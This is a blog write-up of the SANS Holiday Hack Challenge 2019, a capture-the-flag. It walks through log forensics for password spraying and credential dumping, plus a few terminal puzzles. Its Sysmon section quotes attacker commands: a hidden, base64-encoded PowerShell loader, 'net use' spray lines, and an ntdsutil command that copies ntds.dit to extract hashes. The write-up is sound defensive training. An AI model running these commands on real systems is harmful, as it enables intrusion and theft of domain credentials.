SANS Christmas Challenge 2019
=============================
:date: 2020-01-14
:author: useless
:category: Write-up
:slug: sans-christmas-challenge-2019

.. image:: /images/sans-christmas-challenge-2019/sans_christmas_challenge_2019_logo.png
    :alt: sans_christmas_challenge_2019_logo.png
    :align: center

On the twelfth day of Christmas, my true love gave to me:

Twelve Phishers phishing

Eleven Shells a-popping

Ten Passwords spraying

Nine Splunks a-splunking

Eight Machines learning

Seven Metasploit scanning

Six Blue Teamers crying

Five Golden Tickets

Four Domain Hashes

Three Malicious Macros

Two LAN Turtles

and a Pwnage in a Pear Tree

Here's my write-up for the `2019 SANS Christmas Challenge <https://holidayhackchallenge.com/2019/>`__.

.. contents:: Table of contents

Introduction
~~~~~~~~~~~~

This write-up received a `super honorable mention <https://holidayhackchallenge.com/2019/winners_answers.html>`__
from the SANS team. I was also a runner up for the Best Overall Answer. Thank
you so much for this, I'm incredibly humbled!

Santa is organizing a new KringleCon, with new speakers and all that! It's
taking place at Elf University.

.. image:: /images/sans-christmas-challenge-2019/santa.png
    :alt: santa.png
    :align: center

*Santa says*

    Welcome to the North Pole and KringleCon 2!

    Last year, KringleCon hosted over 17,500 attendees and my castle got a
    little crowded.

    We moved the event to Elf University (Elf U for short), the North Pole’s
    largest venue.

    Please feel free to explore, watch talks, and enjoy the con!

Here are the questions we must answer:

1. Someone sent a threatening letter to Elf University. What is the first word
   in ALL CAPS in the subject line of the letter? Please find the letter in the
   Quad.

2. We're seeing attacks against the Elf U domain! Using the `event log data </docs/sans-christmas-challenge-2019/Security.evtx.zip>`__,
   identify the user account that the attacker compromised using a password
   spray attack.

3. Using `these normalized Sysmon logs </docs/sans-christmas-challenge-2019/sysmon-data.json.zip>`__,
   identify the tool the attacker used to retrieve domain password hashes from
   the lsass.exe process.

4. The attacks don't stop! Can you help identify the IP address of the
   malware-infected system using these `Zeek logs <https://downloads.elfu.org/elfu-zeeklogs.zip>`__?

5. Access https://splunk.elfu.org/ as :code:`elf` with password
   :code:`elfsocks`. What was the message for Kent that the adversary embedded
   in this attack? The SOC folks at that link will help you along!

6. Gain access to the steam tunnels. Who took the turtle doves? Please tell us
   their first and last name.

7. Help Krampus beat the `Frido Sleigh contest <https://fridosleigh.com/>`__.

8. Gain access to the data on the `Student Portal <https://studentportal.elfu.org/>`__
   server and retrieve the paper scraps hosted there. What is the name of
   Santa's cutting-edge sleigh guidance system?

9. The Elfscrow Crypto tool is a vital asset used at Elf University for
   encrypting SUPER SECRET documents. We can't send you the source, but we do
   have debug symbols that you can use.

   Recover the plaintext content for this encrypted document. We know that it
   was encrypted on December 6, 2019, between 7pm and 9pm UTC.

   What is the middle line on the cover page? (Hint: it's five words)

10. Visit Shinny Upatree in the Student Union and help solve their problem.
    What is written on the paper you retrieve for Shinny?

11. Use the data supplied in the Zeek JSON logs to identify the IP addresses of
    attackers poisoning Santa's flight mapping software. `Block the 100
    offending sources of information to guide Santa's sleigh <https://srf.elfu.org/>`__
    through the attack. Submit the Route ID ("RID") success value that you're
    given.

Now, this year I did use some hints, because there were some questions that
were outside my domain of expertise. So I thought I wouldn't restrict myself,
so that I could get to the end of the challenge. Anyway, let's get to it!

Objective 0: Talk to Santa in the Quad
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The first objective is to talk to Santa in the Quad.

.. image:: /images/sans-christmas-challenge-2019/santa_squad.png
    :alt: santa_squad.png
    :align: center

*Santa says*

    This is a little embarrassing, but I need your help.

    Our KringleCon turtle dove mascots are missing!

    They probably just wandered off.

    Can you please help find them?

    To help you search for them and get acquainted with KringleCon, I’ve
    created some objectives for you. You can see them in your badge.

    Where's your badge? Oh! It's that big, circle emblem on your chest - give
    it a tap!

    We made them in two flavors - one for our new guests, and one for those
    who've attended both KringleCons.

    After you find the Turtle Doves and complete objectives 2-5, please come
    back and let me know.

    Not sure where to start? Try hopping around campus and talking to some
    elves.

    If you help my elves with some quicker problems, they'll probably remember
    clues for the objectives.

Alright, so the KringleCon's mascots are missing and we must find them. There
are also some more objectives we must fulfill before coming back to Santa.
Let's look for the missing turtle doves!

Objective 1: Find the Turtle Doves
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The two turtle doves are simply in the student union building, next to the
chimney.

.. image:: /images/sans-christmas-challenge-2019/turtledoves.png
    :alt: turtledoves.png
    :align: center

*Michael and Jane, the turtle doves, say*

    Hoot Hooot?

Let's go back to the squad to tell Santa.

Objective 2: Unredact Threatening Document
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In a corner of the squad, we find `a letter </docs/sans-christmas-challenge-2019/LetterToElfUPersonnel.pdf>`__
addressed to the personnel of Elf U, with some redacted content.

However, we can easily recover the redacted content by selecting the text, and
copying/pasting it into a text editor.

.. image:: /images/sans-christmas-challenge-2019/redacted_letter.png
    :alt: redacted_letter.png
    :align: center

*Redacted letter says*

    Date: February 28, 2019

    To the Administration, Faculty, and Staff of Elf University
    17 Christmas Tree Lane
    North Pole

    From: A Concerned and Aggrieved Character

    Subject: DEMAND: Spread Holiday Cheer Confidential
    to Other Holidays and Mythical Characters... OR
    ELSE!

    Attention All Elf University Personnel,

    It remains a constant source of frustration that Elf University and the
    entire operation at the North Pole focuses exclusively on Mr. S. Claus and
    his year-end holiday spree. We URGE you to consider lending your
    considerable resources and expertise in providing merriment, cheer, toys,
    candy, and much more to other holidays year-round, as well as to other
    mythical Confidential characters.

    For centuries, we have expressed our frustration at your lack of
    willingness to spread your cheer beyond the inaptly-called “Holiday
    Season.” There are many other perfectly fine holidays and mythical
    characters that need your direct support year-round.

    If you do not accede to our demands, we will be forced to take matters into
    our own hands.  We do not make this threat lightly. You have less than six
    months to act demonstrably.

    Sincerely,

    --A Concerned and Aggrieved Character

Objective 3: 
~~~~~~~~~~~~
Bushy Evergreen's Cranberry Pi Challenge
----------------------------------------

Bushy is still having problem exiting his editor. But this one is an old one.

::

                      ........................................
                   .;oooooooooooool;,,,,,,,,:loooooooooooooll:
                 .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
               .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
             .''''''''''''''''''''''''''''''''''''''''';ooooo:
           ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
        .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
      .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
      coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
      coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
      coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
      coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
      coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
      coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
      :llllllllllllll,'''''''';llllllllllllllc,
    Oh, many UNIX tools grow old, but this one's showing gray.
    That Pepper LOLs and rolls her eyes, sends mocking looks my way.
    I need to exit, run - get out! - and celebrate the yule.
    Your challenge is to help this elf escape this blasted tool.
    -Bushy Evergreen
    Exit ed.
    1100

So, we need to exit :code:`ed`. I don't know this editor, so I had to search
how to exit it. `Apparently <https://www.computerhope.com/unix/ued.htm>`__,
just inputing :code:`q` is enough:

::

    1100
    q
    Loading, please wait......
    You did it! Congratulations!
    elf@6f68f4ebb298:~$

Windows Log Analysis: Evaluate Attack Outcome
---------------------------------------------

Apparently, the person who wrote the threat letter is serious, because we have
reports saying that there are ongoing attacks against the Elf U domain. We're
given the `event logs </docs/sans-christmas-challenge-2019/Security.evtx.zip>`__,
and tasked to find the account that was compromised using the password spray
attack.

In order to have a format that is more easy to parse, we can use `python-evtx
<https://github.com/williballenthin/python-evtx/>`__ to convert the
:code:`.evtx` to an XML file. There is an `evtx_dump.py <https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py>`__
script to do so:

.. code-block:: console

    $ evtx_dump.py Security.evtx > Security_evtx.xml

Let's take a look at the :code:`EventIDs` in this file:

.. code-block:: console
    :hl_lines: 8

    $ grep EventID Security_evtx.xml | sort | uniq -c | sort -n
          1             <EventID Qualifiers="">1102</EventID>
          1             <EventID Qualifiers="">4616</EventID>
          2             <EventID Qualifiers="">4768</EventID>
          4             <EventID Qualifiers="">4776</EventID>
          5             <EventID Qualifiers="">4769</EventID>
         15             <EventID Qualifiers="">4634</EventID>
         16             <EventID Qualifiers="">4624</EventID>
         16             <EventID Qualifiers="">4672</EventID>
       2386             <EventID Qualifiers="">4625</EventID>
       2387             <EventID Qualifiers="">4648</EventID>

The most interesting is 4624, because it's the one that says that `an account
was successfully logged on <https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624>`__.

Let's create a small Python script to list every accounts with an
:code:`EventID` of 4624:

.. code-block:: python

    #!/usr/bin/env python3

    import sys
    from bs4 import BeautifulSoup

    def main():
        if len(sys.argv) != 2:
            print('usage: {} <security_evtx.xml>')
            return -1

        with open(sys.argv[1], 'r') as f:
            security_evtx = BeautifulSoup(f.read(), 'lxml')

        users_success_login_attempt = set()

        for evt in security_evtx.find_all('event'):
            if evt.system.eventid.contents[0] == '4624':
                try:
                    users_success_login_attempt.add(
                            evt.eventdata.find_all(attrs={'name': 'TargetUserName'})[0].string)
                except IndexError:
                    pass

        print(users_success_login_attempt)

    if __name__ == '__main__':
        main()

.. code-block:: console

    $ ./parse_evtx_xml.py Security_evtx.xml 
    {'supatree', 'DC1$', 'pminstix'}

Only three accounts have this code: :code:`supatree`, :code:`pminstix`, and
:code:`DC1$`. This last one seems to be the domain controller, we can likely
ignore it. So it's between :code:`supatree` and :code:`pminstix`.

Now, how can we determined which one was compromised? There is another
:code:`EventID` that is interesting: the 4625. This ID indicates that `an
account failed to log on <https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625>`__.
During a password spray attack, if an account is compromised, an authentication
attempt succeeded. So the compromised account should have one less event with
ID 4625. Let's do some :code:`grep` magic to find the corresponding account:

.. code-block:: console
    :hl_lines: 32

    $ grep -wE '4625|TargetUserName' Security_evtx.xml | grep -A 1 '4625' | grep TargetUserName | sort | uniq -c | sort -nr 
         77 <Data Name="TargetUserName">ygreenpie</Data>
         77 <Data Name="TargetUserName">ygoldentrifle</Data>
         77 <Data Name="TargetUserName">wopenslae</Data>
         77 <Data Name="TargetUserName">twinterfig</Data>
         77 <Data Name="TargetUserName">ttinselbubbles</Data>
         77 <Data Name="TargetUserName">tcandybaubles</Data>
         77 <Data Name="TargetUserName">sscarletpie</Data>
         77 <Data Name="TargetUserName">smullingfluff</Data>
         77 <Data Name="TargetUserName">smary</Data>
         77 <Data Name="TargetUserName">sgreenbells</Data>
         77 <Data Name="TargetUserName">pbrandyberry</Data>
         77 <Data Name="TargetUserName">mstripysleigh</Data>
         77 <Data Name="TargetUserName">mbrandybells</Data>
         77 <Data Name="TargetUserName">ltrufflefig</Data>
         77 <Data Name="TargetUserName">lstripyleaves</Data>
         77 <Data Name="TargetUserName">hevergreen</Data>
         77 <Data Name="TargetUserName">hcandysnaps</Data>
         77 <Data Name="TargetUserName">gchocolatewine</Data>
         77 <Data Name="TargetUserName">gcandyfluff</Data>
         77 <Data Name="TargetUserName">ftwinklestockings</Data>
         77 <Data Name="TargetUserName">ftinseltoes</Data>
         77 <Data Name="TargetUserName">esparklesleigh</Data>
         77 <Data Name="TargetUserName">dsparkleleaves</Data>
         77 <Data Name="TargetUserName">cstripyfluff</Data>
         77 <Data Name="TargetUserName">cjinglebuns</Data>
         77 <Data Name="TargetUserName">civysparkles</Data>
         77 <Data Name="TargetUserName">civypears</Data>
         77 <Data Name="TargetUserName">bevergreen</Data>
         77 <Data Name="TargetUserName">bbrandyleaves</Data>
         77 <Data Name="TargetUserName">Administrator</Data>
         76 <Data Name="TargetUserName">supatree</Data>

Let's decompose this command. The first part is:

::

   grep -wE '4625|TargetUserName' Security_evtx.xml 

It will select every line containing the string 4625 or
:code:`TargetUserName`.

On to the second part:

::

    | grep -A 1 '4625'

It will select in the previous output every line containing 4625
and the line after it. This will give us an output of every event ID 4625 and
every associated username. Here's the output:

::

    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">Administrator</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">bbrandyleaves</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">bevergreen</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">civypears</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">civysparkles</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">cjinglebuns</Data>
    --
    <EventID Qualifiers="">4625</EventID>
    <Data Name="TargetUserName">cstripyfluff</Data>

For the third part:

::

    | grep TargetUserName

It will select every username in the previous output. We now have the list of
every username with a failed authentication attempt.

Finally the last part:

::

    | sort | uniq -c | sort -nr

It will sort every entry, count every occurrence, and sort it by number of
occurrences. This gives us the final output:

::

     77 <Data Name="TargetUserName">ygreenpie</Data>
     77 <Data Name="TargetUserName">ygoldentrifle</Data>
     77 <Data Name="TargetUserName">wopenslae</Data>
     77 <Data Name="TargetUserName">twinterfig</Data>
     77 <Data Name="TargetUserName">ttinselbubbles</Data>
     77 <Data Name="TargetUserName">tcandybaubles</Data>
     77 <Data Name="TargetUserName">sscarletpie</Data>
     77 <Data Name="TargetUserName">smullingfluff</Data>
     77 <Data Name="TargetUserName">smary</Data>
     77 <Data Name="TargetUserName">sgreenbells</Data>
     77 <Data Name="TargetUserName">pbrandyberry</Data>
     77 <Data Name="TargetUserName">mstripysleigh</Data>
     77 <Data Name="TargetUserName">mbrandybells</Data>
     77 <Data Name="TargetUserName">ltrufflefig</Data>
     77 <Data Name="TargetUserName">lstripyleaves</Data>
     77 <Data Name="TargetUserName">hevergreen</Data>
     77 <Data Name="TargetUserName">hcandysnaps</Data>
     77 <Data Name="TargetUserName">gchocolatewine</Data>
     77 <Data Name="TargetUserName">gcandyfluff</Data>
     77 <Data Name="TargetUserName">ftwinklestockings</Data>
     77 <Data Name="TargetUserName">ftinseltoes</Data>
     77 <Data Name="TargetUserName">esparklesleigh</Data>
     77 <Data Name="TargetUserName">dsparkleleaves</Data>
     77 <Data Name="TargetUserName">cstripyfluff</Data>
     77 <Data Name="TargetUserName">cjinglebuns</Data>
     77 <Data Name="TargetUserName">civysparkles</Data>
     77 <Data Name="TargetUserName">civypears</Data>
     77 <Data Name="TargetUserName">bevergreen</Data>
     77 <Data Name="TargetUserName">bbrandyleaves</Data>
     77 <Data Name="TargetUserName">Administrator</Data>
     76 <Data Name="TargetUserName">supatree</Data>

We can see that :code:`supatree` has one less failed authentication attempt.
This must means that it's the account that was compromised by the password
spray attack.

Objective 4:
~~~~~~~~~~~~
SugarPlum Mary's Cranberry Pi Challenge
---------------------------------------

We're supposed to list the content of the current directory:

.. code-block:: console

    K000K000K000KK0KKKKKXKKKXKKKXKXXXXXNXXXX0kOKKKK0KXKKKKKKK0KKK0KK0KK0KK0KK0KK0KKKKKK
    00K000KK0KKKKKKKKKXKKKXKKXXXXXXXXNXXNNXXooNOXKKXKKXKKKXKKKKKKKKKK0KKKKK0KK0KK0KKKKK
    KKKKKKKKKKKXKKXXKXXXXXXXXXXXXXNXNNNNNNK0x:xoxOXXXKKXXKXXKKXKKKKKKKKKKKKKKKKKKKKKKKK
    K000KK00KKKKKKKKXXKKXXXXNXXXNXXNNXNNNNNWk.ddkkXXXXXKKXKKXKKXKKXKKXKKXK0KK0KK0KKKKKK
    00KKKKKKKKKXKKXXKXXXXXNXXXNXXNNNNNNNNWXXk,ldkOKKKXXXXKXKKXKKXKKXKKKKKKKKKK0KK0KK0XK
    KKKXKKKXXKXXXXXNXXXNXXNNXNNNNNNNNNXkddk0No,;;:oKNK0OkOKXXKXKKXKKKKKKKKKKKKK0KK0KKKX
    0KK0KKKKKXKKKXXKXNXXXNXXNNXNNNNXxl;o0NNNo,,,;;;;KWWWN0dlk0XXKKXKKXKKXKKKKKKKKKKKKKK
    KKKKKKKKXKXXXKXXXXXNXXNNXNNNN0o;;lKNNXXl,,,,,,,,cNNNNNNKc;oOXKKXKKXKKXKKXKKKKKKKKKK
    XKKKXKXXXXXXNXXNNXNNNNNNNNN0l;,cONNXNXc',,,,,,,,,KXXXXXNNl,;oKXKKXKKKKKK0KKKKK0KKKX
    KKKKKKXKKXXKKXNXXNNXNNNNNXl;,:OKXXXNXc''',,''''',KKKKKKXXK,,;:OXKKXKKXKKX0KK0KK0KKK
    KKKKKKKKXKXXXXXNNXXNNNNW0:;,dXXXXXNK:'''''''''''cKKKKKKKXX;,,,;0XKKXKKXKKXKKK0KK0KK
    XXKXXXXXXXXXXNNNNNNNNNN0;;;ONXXXXNO,''''''''''''x0KKKKKKXK,',,,cXXKKKKKKKKXKKK0KKKX
    KKKKKKKXKKXXXXNNNNWNNNN:;:KNNXXXXO,'.'..'.''..':O00KKKKKXd'',,,,KKXKKXKKKKKKKKKKKKK
    KKKKKXKKXXXXXXXXNNXNNNx;cXNXXXXKk,'''.''.''''.,xO00KKKKKO,'',,,,KK0XKKXKKK0KKKKKKKK
    XXXXXXXXXKXXXXXXXNNNNNo;0NXXXKKO,'''''''.'.'.;dkOO0KKKK0;.'',,,,XXXKKK0KK0KKKKKKKKX
    XKKXXKXXXXXXXXXXXNNNNNcoNNXXKKO,''''.'......:dxkOOO000k,..''',,lNXKXKKXKKK0KKKXKKKK
    KXXKKXXXKXXKXXXXXXXNNNoONNXXX0;'''''''''..'lkkkkkkxxxd'...'''',0N0KKKKKXKKKKKK0XKKK
    XXXXXKKXXKXXXXXXXXXXXXOONNNXXl,,;;,;;;;;;;d0K00Okddoc,,,,,,,,,xNNOXKKKKKXKKKKKKKXKK
    XXXXXXXXXXXXXXXXXXXXXXXONNNXx;;;;;;;;;,,:xO0KK0Oxdoc,,,,,,,,,oNN0KXXKKXKKXKKKKKKKXK
    XKXXKXXXXXXXXXXXXXXXXXXXXWNX:;;;;;;;;;,cO0KKKK0Okxl,,,,,,,,,oNNK0NXXXXXXXXXKKKKKKKX
    XXXXXXXXXXXXXXXXXXXXXXXNNNWNc;;:;;;;;;xKXXXXXXKK0x,,,,,,,,,dXNK0NXXXXXXXXXXXKKXKKKK
    XKXXXXXXXXXXXXXXXXXXXXNNWWNWd;:::;;;:0NNNNNNNNNXO;,,,,,,,:0NN0XNXNXXXXXXXXXXXKKXKKX
    NXXXXXXXXXXXXXXXXXXXXXNNNNNNNl:::;;:KNNNNNNNNNNO;,,,,,,;xNNK0NXNXXNXXXXXXKXXKKKKXKK
    XXNNXNNNXXXXXXXXXXXXXNNNNNNNNNkl:;;xWWNNNNNWWWk;;;;;;;xNNKKXNXNXXNXXXXXXXXXXXKXKKXK
    XXXXXNNNNXNNNNXXXXXXNNNNNNNNNNNNKkolKNNNNNNNNx;;;;;lkNNXNNNNXXXNXXNXXXXXXXXXXXKKKKX
    XXXXXXXXXXXNNNNNNNNNNNNNNNNNNNNNNNNNKXNNNNWNo:clxOXNNNNNNNNXNXXXXXXXXXXXXXXXKKXKKKK
    XXXXNXXXNXXXNXXNNNNNWWWWWNNNNNNNNNNNNNNNNNWWNWWNWNNWNNNNNNNNXXXXXXNXXXXXXXXXXKKXKKX
    XNXXXXNNXXNXXNNXNXNWWWWWWWWWNNNNNNNNNNNNNWWWWNNNNNNNNNNNNNNNNNNNNNXNXXXXNXXXXXXKXKK
    XXXXNXXNNXXXNXXNXXNWWWNNNNNNNNNWWNNNNNNNNWWWWWWNWNNNNNNNNNNNNNNNXXNXNXXXXNXXXXKXKXK
    I need to list files in my home/
    To check on project logos
    But what I see with ls there,
    Are quotes from desert hobos...
    which piece of my command does fail?
    I surely cannot find it.
    Make straight my path and locate that-
    I'll praise your skill and sharp wit!
    Get a listing (ls) of your current directory.
    elf@ffba3960c30f:~$

Alright, let's just :code:`ls` the directory:

.. code-block:: console

    elf@ffba3960c30f:~$ ls
    This isn't the ls you're looking for

Hmm, weird. It looks like the :code:`ls` binary was replaced. Let's see which
program is used using the :code:`which` command:

.. code-block:: console

    elf@ffba3960c30f:~$ which ls
    /usr/local/bin/ls

Indeed, it does not seem to be the usual :code:`ls` binary. Let's search for
every file named :code:`ls` at the root of the file system:

.. code-block:: console
    :hl_lines: 3

    elf@ffba3960c30f:~$ find / -name ls -type f 2>/dev/null
    /usr/local/bin/ls
    /bin/ls

The usual :code:`ls` binary seems to be at :code:`/bin/ls`. So let's call this
binary directly:

.. code-block:: console

    elf@ffba3960c30f:~$ /bin/ls
    ' '   rejected-elfu-logos.txt
    Loading, please wait......



    You did it! Congratulations!


Windows Log Analysis: Determine Attacker Technique
--------------------------------------------------

We're given `Sysmong logs </docs/sans-christmas-challenge-2019/sysmon-data.json.zip>`__
to try and understand which technique the attacker used. We're asked to
identify what tool the attacker used to retrieve domain password hashes from
the :code:`lsass.exe` process.

In these logs, we have a lot of interesting events. We can see the execution of
suspicious PowerShell commands:

.. code-block:: json

    {
        "command_line": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "?",
        "parent_process_path": "?",
        "pid": 3468,
        "ppid": 616,
        "process_name": "cmd.exe",
        "process_path": "C:\\Windows\\System32\\cmd.exe",
        "subtype": "create",
        "timestamp": 132110784202880000,
        "unique_pid": "{7431d376-7e14-5d60-0000-0010bffd2500}",
        "unique_ppid": "{00000000-0000-0000-0000-000000000000}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    }

Or the password spray attacks:

.. code-block:: json
    :hl_lines: 2 20 38

    {
        "command_line": "net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bbrandyleaves ???Summer2019  ",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\SysWOW64\\cmd.exe",
        "pid": 752,
        "ppid": 1072,
        "process_name": "net.exe",
        "process_path": "C:\\Windows\\SysWOW64\\net.exe",
        "subtype": "create",
        "timestamp": 132186397042689984,
        "unique_pid": "{7431d376-de58-5dd3-0000-0010d9b82600}",
        "unique_ppid": "{7431d376-de52-5dd3-0000-0010dea72600}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    },
    {
        "command_line": "net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bevergreen ???Summer2019  ",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\SysWOW64\\cmd.exe",
        "pid": 724,
        "ppid": 1072,
        "process_name": "net.exe",
        "process_path": "C:\\Windows\\SysWOW64\\net.exe",
        "subtype": "create",
        "timestamp": 132186397042960000,
        "unique_pid": "{7431d376-de58-5dd3-0000-00104dbd2600}",
        "unique_ppid": "{7431d376-de52-5dd3-0000-0010dea72600}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    },
    {
        "command_line": "net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\civypears ???Summer2019  ",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\SysWOW64\\cmd.exe",
        "pid": 2848,
        "ppid": 1072,
        "process_name": "net.exe",
        "process_path": "C:\\Windows\\SysWOW64\\net.exe",
        "subtype": "create",
        "timestamp": 132186397043230000,
        "unique_pid": "{7431d376-de58-5dd3-0000-0010c1c12600}",
        "unique_ppid": "{7431d376-de52-5dd3-0000-0010dea72600}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    },

But the last event is the most interesting one:

.. code-block:: json
    :hl_lines: 2

    {
        "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
        "event_type": "process",
        "logon_id": 999,
        "parent_process_name": "cmd.exe",
        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
        "pid": 3556,
        "ppid": 3440,
        "process_name": "ntdsutil.exe",
        "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
        "subtype": "create",
        "timestamp": 132186398470300000,
        "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
        "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
        "user": "NT AUTHORITY\\SYSTEM",
        "user_domain": "NT AUTHORITY",
        "user_name": "SYSTEM"
    }

The :code:`ntdsutil.exe` can be used to create a full back-up of the
:code:`ntds.dit` hive on a domain controller. This file can then be parsed with
something like `secretsdump.py <https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py>`__.

I first thought that this was not the correct answer, because, as I understand
it, :code:`ntdsutil.exe` does not interact with the :code:`lsass.exe` to
extract password hashes: an external tool must be used to extract these hashes.
Then, after analyzing the rest of the log file, I didn't see any other tool
that could be used to extract hashes. So I tried to answer
:code:`ntdsutil.exe`, but was given an error message by the KringleCon form.

It turns out that the correct solution is :code:`ntdsutil`.

Objective 5:
~~~~~~~~~~~~
Sparkle Redberry's Canberry Pi Challenge
----------------------------------------

Apparently, the research lab at Elf U is building a laser that can shoot beams
of Christmas cheer. However, someone apparently messed with the parameters, and
now the laser is not producing enough Mega-Jollies per liter.

.. code-block:: ps1con

    WARNGING: ctrl + c restricted in this terminal - Do not use endless loops
    Type exit to exit PowerShell.
    PowerShell 6.2.3
    Copyright (c) Microsoft Corporation. All rights reserved.
    https://aka.ms/pscore6-docs
    Type 'help' to get help.
